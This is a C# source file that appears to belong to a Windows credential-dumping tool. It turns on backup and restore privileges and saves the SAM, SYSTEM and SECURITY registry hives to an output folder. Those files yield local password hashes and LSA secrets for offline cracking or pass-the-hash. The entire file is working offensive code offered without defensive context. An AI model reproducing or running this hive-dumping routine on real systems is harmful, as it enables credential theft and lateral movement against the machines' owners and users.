using System;
using static RegSave.Interop;
using System.IO;

internal class regSave
{
    public static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
    public static int KEY_READ = 0x20019;
    public static int KEY_ALL_ACCESS = 0xF003F;
    public static int REG_OPTION_OPEN_LINK = 0x0008;
    public static int REG_OPTION_BACKUP_RESTORE = 0x0004;
    public static int KEY_QUERY_VALUE = 0x1;


    public static string sampath;
    public static string securitypath;
    public static string systempath;

    public static void ExportRegKey(string key, string outFile)
    {
        var hKey = UIntPtr.Zero;
        try
        {
            RegOpenKeyEx(HKEY_LOCAL_MACHINE, key, REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_ALL_ACCESS, out hKey); //https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
            RegSaveKey(hKey, outFile, IntPtr.Zero);
            RegCloseKey(hKey);
            Console.WriteLine("[+] Exported HKLM\\{0} successful!", key, outFile);
        }
        catch (Exception e)
        {
            throw e;
        }

    }

    public static void SaveReg()
    {
        Privileges.EnableDisablePrivilege("SeBackupPrivilege", true);
        Privileges.EnableDisablePrivilege("SeRestorePrivilege", true);
        string path = System.Environment.CurrentDirectory;
        sampath = Path.Combine(dumphash.ResultPath, "sam");
        systempath = Path.Combine(dumphash.ResultPath, "system");
        securitypath = Path.Combine(dumphash.ResultPath, "security");

        try
        {
            
            ExportRegKey("SAM", sampath);
            ExportRegKey("SYSTEM", systempath);
            ExportRegKey("SECURITY", securitypath);
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
            Console.WriteLine(e.StackTrace);
        }
    }
}

